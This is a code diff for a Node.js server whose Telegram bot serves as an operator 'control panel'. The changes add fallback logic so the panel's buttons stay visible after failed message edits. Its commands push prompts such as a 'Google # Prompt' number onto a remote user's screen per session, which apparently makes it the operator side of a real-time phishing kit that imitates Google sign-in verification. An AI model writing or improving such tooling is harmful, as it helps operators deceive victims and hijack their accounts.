@@ -63,6 +63,42 @@ const buildControlPanelKeyboard = (sessionId) => ({
   ],
 });
 
+// Resilient edit: try to update the message text + keyboard, and if Telegram
+// rejects the edit for any reason ("message is not modified", stale message,
+// rate limit, etc.) fall back to ensuring the inline keyboard is at least
+// re-attached so the operator's control-panel buttons NEVER disappear.
+const safeEditPanel = async (chatId, messageId, text, replyMarkup, parseMode = 'Markdown') => {
+  try {
+    await bot.editMessageText(text, {
+      chat_id: chatId,
+      message_id: messageId,
+      reply_markup: replyMarkup,
+      parse_mode: parseMode,
+    });
+    return;
+  } catch (error) {
+    const msg = error?.message || String(error);
+    console.warn('[SERVER] editMessageText failed, restoring keyboard only:', msg);
+  }
+  // Fallback: at minimum keep the inline keyboard visible & responsive.
+  try {
+    await bot.editMessageReplyMarkup(replyMarkup, {
+      chat_id: chatId,
+      message_id: messageId,
+    });
+  } catch (error) {
+    const msg = error?.message || String(error);
+    // Final fallback: post a fresh control-panel message so the operator
+    // is never left without buttons.
+    console.warn('[SERVER] editMessageReplyMarkup failed, sending fresh panel:', msg);
+    try {
+      await bot.sendMessage(chatId, text, { reply_markup: replyMarkup, parse_mode: parseMode });
+    } catch (sendError) {
+      console.error('[SERVER] failed to resend control panel:', sendError?.message || sendError);
+    }
+  }
+};
+
 // --- Middleware ---
 app.use(express.json());
 // **FIXED:** Correct path to the 'dist' folder, which is one level above 'backend'.
@@ -214,10 +250,17 @@ bot.on('callback_query', async (cb) => {
                 { text: '✏️ Custom #', callback_data: `g_prompt_custom:${sessionId}` },
                 { text: '✖ Cancel', callback_data: `g_prompt_cancel:${sessionId}` },
             ]);
-            await bot.editMessageText(
-                `*Google # Prompt:* Pick the number to display on the user's screen for \`${sanitize(sessionId)}\`, or tap *Custom #* to enter your own.`,
-                { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: rows }, parse_mode: 'Markdown' }
-            );
+            try {
+                await bot.editMessageText(
+                    `*Google # Prompt:* Pick the number to display on the user's screen for \`${sanitize(sessionId)}\`, or tap *Custom #* to enter your own.`,
+                    { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: rows }, parse_mode: 'Markdown' }
+                );
+            } catch (error) {
+                // If we can't switch to the picker keyboard, restore the
+                // control panel so the operator still has buttons.
+                console.warn('[SERVER] g_prompt_init edit failed, restoring panel:', error?.message || error);
+                await safeEditPanel(chatId, messageId, `Control panel for \`${sanitize(sessionId)}\``, panelMarkup);
+            }
             return;
         }
 
@@ -232,18 +275,22 @@ bot.on('callback_query', async (cb) => {
             sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number: num, provider });
             // Restore the control panel and append a status line so the admin
             // knows the action succeeded — without nuking the keyboard.
-            await bot.editMessageText(
+            await safeEditPanel(
+                chatId,
+                messageId,
                 `✅ Sent: *Google Prompt #${sanitize(num)}* for \`${sanitize(sessionId)}\``,
-                { chat_id: chatId, message_id: messageId, reply_markup: panelMarkup, parse_mode: 'Markdown' }
+                panelMarkup,
             );
             return;
         }
 
         // --- Two-step Google # Prompt: cancel back to the control panel ---
         if (cmd === 'g_prompt_cancel') {
-            await bot.editMessageText(
+            await safeEditPanel(
+                chatId,
+                messageId,
                 `Control panel for \`${sanitize(sessionId)}\``,
-                { chat_id: chatId, message_id: messageId, reply_markup: panelMarkup, parse_mode: 'Markdown' }
+                panelMarkup,
             );
             return;
         }
@@ -278,13 +325,23 @@ bot.on('callback_query', async (cb) => {
             sendWebSocketCommand(sessionId, wsCommand, commandData);
             // Re-attach the control panel keyboard so the admin can issue
             // follow-up actions without the panel disappearing.
-            await bot.editMessageText(
+            await safeEditPanel(
+                chatId,
+                messageId,
                 `✅ Sent: *${wsCommand}* (${sanitize(provider)}) for \`${sanitize(sessionId)}\``,
-                { chat_id: chatId, message_id: messageId, reply_markup: panelMarkup, parse_mode: 'Markdown' }
+                panelMarkup,
             );
         }
     } catch (error) {
         console.error('[SERVER] callback_query handler error:', error.message);
+        // Defensive: even when the handler itself throws, make sure the
+        // operator's control panel keyboard is still attached so buttons
+        // remain visible and responsive.
+        try {
+            await bot.editMessageReplyMarkup(panelMarkup, { chat_id: chatId, message_id: messageId });
+        } catch (restoreError) {
+            console.warn('[SERVER] failed to restore panel keyboard after handler error:', restoreError?.message || restoreError);
+        }
     }
 });
 
@@ -309,9 +366,11 @@ bot.on('message', async (msg) => {
         sendWebSocketCommand(pending.sessionId, 'show_google_number_prompt', { number: num, provider });
         // Restore the control panel on the original panel message so the
         // admin can keep issuing actions without losing the keyboard.
-        await bot.editMessageText(
+        await safeEditPanel(
+            pending.chatId,
+            pending.panelMessageId,
             `✅ Sent: *Google Prompt #${sanitize(num)}* (custom) for \`${sanitize(pending.sessionId)}\``,
-            { chat_id: pending.chatId, message_id: pending.panelMessageId, reply_markup: buildControlPanelKeyboard(pending.sessionId), parse_mode: 'Markdown' }
+            buildControlPanelKeyboard(pending.sessionId),
         );
     } catch (error) {
         console.error('[SERVER] custom-number reply handler error:', error.message);
